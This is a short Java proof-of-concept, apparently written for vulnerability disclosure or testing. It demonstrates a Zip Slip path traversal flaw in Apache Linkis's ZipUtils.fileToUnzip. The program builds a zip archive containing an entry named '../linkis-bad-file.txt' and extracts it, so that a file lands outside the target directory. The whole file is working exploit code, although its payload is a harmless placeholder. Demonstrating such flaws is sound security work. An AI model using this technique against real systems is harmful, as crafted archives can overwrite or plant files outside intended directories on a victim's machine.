package org.example;

import org.apache.linkis.common.utils.ZipUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class LinkisAttack {

    public static void main(String[] args) throws IOException {
        String zipFileName = "exposed/linkis-exploit.zip";
        String fileNameInsideZip = "../linkis-bad-file.txt";
        createZip(zipFileName, fileNameInsideZip, "Some file content");

        File destDir = new File("exposed/linkis-unzipped");
        destDir.mkdir();

        ZipUtils.fileToUnzip(zipFileName, destDir.getAbsolutePath());
    }

    private static void createZip(String zipFileName, String entryName, String fileContent) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(zipFileName);
             ZipOutputStream zipOut = new ZipOutputStream(fos)) {
            ZipEntry zipEntry = new ZipEntry(entryName);
            zipOut.putNextEntry(zipEntry);
            zipOut.write(fileContent.getBytes());
            zipOut.closeEntry();
        }
    }
}
